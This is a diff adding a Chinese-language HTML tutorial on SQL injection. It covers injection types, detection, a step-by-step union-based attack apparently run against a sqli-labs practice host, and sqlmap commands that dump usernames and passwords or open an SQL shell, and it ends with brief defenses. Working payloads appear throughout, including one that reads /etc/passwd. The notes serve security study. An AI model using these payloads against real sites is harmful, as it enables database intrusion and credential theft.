@@ -1,0 +1,188 @@
+<!doctype html>
+<html>
+<head>
+<meta charset='UTF-8'><meta name='viewport' content='width=device-width initial-scale=1'>
+<title>SQL注入</title>
+</head>
+<body><h1 id='sql注入分类'>SQL注入分类</h1>
+<p>数字型:
+select字段名from表名where id= 1;</p>
+<pre><code>http://www.sql.com/xxx.php?id=1
+假设ID为存在注入的参数
+http://www.sql.com/xxx.php?id=1&#39;
+语句报错
+http://www.sq1.com/xxx.php?id=1 and 1=1
+页面正常返回结果
+http://www.sq1.com/xxx.php?id=1 and 1=2
+页面返回错误
+</code></pre>
+<p>字符型:
+select字段名from表名where id = 1;</p>
+<pre><code>http://www.sql.com/xxx.php?id=1
+假设ID为存在注入的参数
+http://www.sql.com/xxx.php?id=1&#39;
+语句报错
+http://www.sql.com/xxx.php?id=1&#39; and &#39;1&#39;=&#39;1页面正常返回结果
+id =&#39;$&#39;
+id =&#39;1&#39;
+id =&#39;1&#39;&#39;
+id = &#39;1&#39; and &#39;1&#39;=&#39;1&#39;
+http://www.sq1.com/xxx.php?id=1&#39; and &#39;1&#39;=&#39;2 页面返回错误
+</code></pre>
+<p>在学习owasp相关文章时，发现他们通常将sql注入攻击分为三类:</p>
+<ul>
+<li>带内注入: 使用与注入sql代码相同的通道提取数据(即使用web 正常功能检索数据，并且检索的数据直接显示在网页中)，比如常见的显错注入。</li>
+<li>带外注入: 使用其他渠道检索数据(比如将检索的数据通过dns或者电子邮件传输)。</li>
+<li>盲注(也有称为推理注入) : 没有实际的数据传输，但是通过特定请求可以观察到sql服务器的异常行为，以此来推理出结果，比如常见的延时注入和堆叠注入。</li>
+
+</ul>
+<p>更普遍的一种分类方式是按照效果分类，共有7类，分别是:</p>
+<ul>
+<li>布尔注入</li>
+<li>联合注入</li>
+<li>显错注入</li>
+<li>延时注入</li>
+<li>宽字节注入</li>
+<li>带外注入</li>
+<li>堆叠注入</li>
+
+</ul>
+<h1 id='利用场景'>利用场景</h1>
+<p>1.获取管理员用户或者其他用户的账户信息</p>
+<p>2.利用数据库的漏洞进行提权</p>
+<p>3.获取数据库里面的敏感信息</p>
+<p>4.更改数据库里面的数据</p>
+<h1 id='漏洞危害'>漏洞危害</h1>
+<p>1.攻击者可以利用漏洞查询其他用户的用户凭据</p>
+<p>2.攻击者可能控制数据库中的所有数据</p>
+<p>3.提权安装后门木马</p>
+<p>4.恶意操作，如清空数据库</p>
+<h1 id='检测方法'>检测方法</h1>
+<h2 id='显错注入'>显错注入</h2>
+<pre><code>SELECT first_name, last_name FROM users WHERE user_id = &#39;1&#39;;
+SELECT first_name, last_name FROM users WHERE user_id = &#39;1&#39;&#39;;
+</code></pre>
+<h2 id='布尔注入'>布尔注入</h2>
+<p>用来快速获取数据</p>
+<pre><code>SELECT first_name, last_name FROM users WHERE user_id = &#39;1&#39;;
+SELECT first_name, last_name FROM users WHERE user_id = &#39;99&#39; or 1=1 #&#39;&#39;;
+SELECT first_name, last_name FROM users WHERE user_id = &#39;99&#39; and 1=1 #&#39;&#39;;
+</code></pre>
+<p>获取指定信息使用and,获取所有信息使用or</p>
+<pre><code>1&#39; and ascii (substr (database(),4,1))&gt;96 #真
+1&#39; and ascii (substr (database(),4,1))&lt;97 #假
+1&#39; and ascii (substr (database(),4,1))&lt;98 #真
+ascii 97-&gt;a
+dvwa
+
+1&#39; and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #
+
+1&#39; and (select count(column_name) from information_schema.columns where table_name=0x7573657273)=8 #
+users的16进制
+显示存在，说明uers表有8个字段。
+
+</code></pre>
+<h2 id='联合注入'>联合注入</h2>
+<p>union关键词</p>
+<pre><code>SELECT [colums_name] from [table_name] or UNION SELECT x, y, z-
+基于union查询需要保持列数一致这个逻辑
+</code></pre>
+<p>输入payload:  &#39;union select 1,2 --&#39;   相当于执行语句  mysql&gt; select user_name , user_password from user_information where user_id=&#39; &#39;union select 1,2--&#39;&#39;;</p>
+<p>&nbsp;</p>
+<pre><code>&#39;union select load_file(&#39;/etc/passwd&#39;),2 --  查看文件
+</code></pre>
+<pre><code>1&#39; union select 1,table_name from information_schema.tables where table_schema=database() #
+查看所有表名
+</code></pre>
+<p>order字句查询列数</p>
+<pre><code>1&#39; order by 1#
+1&#39; order by 2#
+1&#39; order by 3#
+1&#39; order by 4#
+</code></pre>
+<h2 id='延时注入'>延时注入</h2>
+<pre><code>1&#39; and sleep(6) #
+1&#39; and if(length(database())&gt;0,sleep(9),1) #   转圈圈
+1&#39; and if(length(database())&gt;3,sleep(9),1) #   转圈圈
+1&#39; and if(length(database())&gt;4,sleep(9),1) #   不转圈圈
+</code></pre>
+<p>id是 1&#39; and if(length(database())&gt;0,sleep(9),1) # 明显延迟，说明数据库名的长度为4个字符;</p>
+<p>抓包改参数id为</p>
+<pre><code>1&#39; and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(4),1) #
+</code></pre>
+<p>明显延迟，说明数据库中的第一个表名长度为9个字符;</p>
+<p>抓包改参数id为</p>
+<pre><code>1&#39; and if((select count(column_name) from information_schema.columns where table_name=0x7573657273)=8,sleep(5),1) #
+</code></pre>
+<p>明显延迟，说明uers表有8个字段。</p>
+<h1 id='完整的sql注入攻击流程'>完整的SQL注入攻击流程</h1>
+<p>1.判断是否能够注入</p>
+<pre><code>http://daishen.ltd:1112/Less-1/?id=1
+</code></pre>
+<p>2.判断表中存在几个字段</p>
+<pre><code>id=1&#39; order by 4 --+
+</code></pre>
+<p>3.判断字段位置</p>
+<pre><code>id=1&#39; and 1=2 union select 1,2,3 --+
+</code></pre>
+<p>4.爆所有库.</p>
+<pre><code>id=1&#39; and 1=2 union select 1,database(),3 --+   查看当前库
+
+id=1&#39; and 1=2 union select 1,group_concat(schema_name),3 from information_schema.schemata --+
+</code></pre>
+<p>5.爆指定库的所有表</p>
+<pre><code>id=1&#39; and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=&#39;security&#39; --+
+</code></pre>
+<p>6.爆指定表的所有字段</p>
+<pre><code>id=1&#39; and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#39;security&#39; and table_name=&#39;users&#39; --+
+</code></pre>
+<p>7.爆出字段内容</p>
+<pre><code>id=1&#39; and 1=2 union select 1,username,password from users where id=1 --+
+
+id=1&#39; and 1=2 union select 1,group_concat(username),group_concat(password) from security.users --+
+</code></pre>
+<h1 id='使用sqlmap进行自动化攻击'>使用sqlmap进行自动化攻击</h1>
+<p>扫描URL目标</p>
+<pre><code>sqlmap -u &quot;daishen.ltd:1112/Less-1/?id=1&quot;
+</code></pre>
+<p>查看所有库</p>
+<pre><code>sqlmap -u &quot;daishen.ltd:1112/Less-1/?id=1&quot; -dbs
+</code></pre>
+<p>查看所有表</p>
+<pre><code>sqlmap -u &quot;daishen.ltd:1112/Less-1/?id=1&quot; -D security --tables
+</code></pre>
+<p>查看表字段</p>
+<pre><code>sqlmap -u &quot;daishen.ltd:1112/Less-1/?id=1&quot; -D security -T users --columns
+</code></pre>
+<p>查看表字段内容</p>
+<pre><code>sqlmap -u &quot;daishen.ltd:1112/Less-1/?id=1&quot; -D security -T users --columns -C &quot;username,password&quot; -dump
+</code></pre>
+<p>进入sql-shell</p>
+<pre><code> sqlmap -u &quot;daishen.ltd:1112/Less-1/?id=1&quot; --sql-shell
+</code></pre>
+<p>随机agent</p>
+<pre><code>sqlmap -u &quot;daishen.ltd:1112/Less-1/?id=1&quot; --random-agent
+</code></pre>
+<p>多线程</p>
+<pre><code>sqlmap -u &quot;daishen.ltd:1112/Less-1/?id=1&quot; --threads=4
+</code></pre>
+<p>导出HTTP详细请求</p>
+<pre><code>sqlmap -u &quot;daishen.ltd:1112/Less-1/?id=1&quot; -t http.log
+</code></pre>
+<p>带cookie注入</p>
+<pre><code>sqlmap -u &quot;daishen.ltd:1112/Less-1/?id=1&quot; --cookie=&quot;PHPSESSID=1b5arqpjub0o45b27e3s8ukf8c; security=low&quot;
+</code></pre>
+<pre><code>--mobile				有时服务端只接收移动端的访问，此时可以设定一个手机的User-Agent来模仿手机登陆 
+--level=LEVEL			执行测试的等级(1-5， 默认为1)
+--risk=RISK				执行测试的风险(0-3, 默认为1)
+--time-sec=TIMESEC		DBMS响应的延迟时间(默认为5秒)
+-U USER					用来进行枚举的数据库用户
+--sql-query=QUERY		要执行的SQL语句
+--tamper				指定脚本
+</code></pre>
+<h1 id='sql注入与防御'>SQL注入与防御</h1>
+<p>1.过滤（输入验证）：检测用户输入的合法性确保输入的内容是正常数据，数据校验最重要的就是在服务端校验</p>
+<p>2.禁止回显错误报告：禁止回显错误信息，提高攻击难度</p>
+<p>3.预编译输入：PDO (PHP Data Objects)采用预处理的方式，事先创建SQL语句模板，并发送到资料库，预处理，占位符</p>
+</body>
+</html>
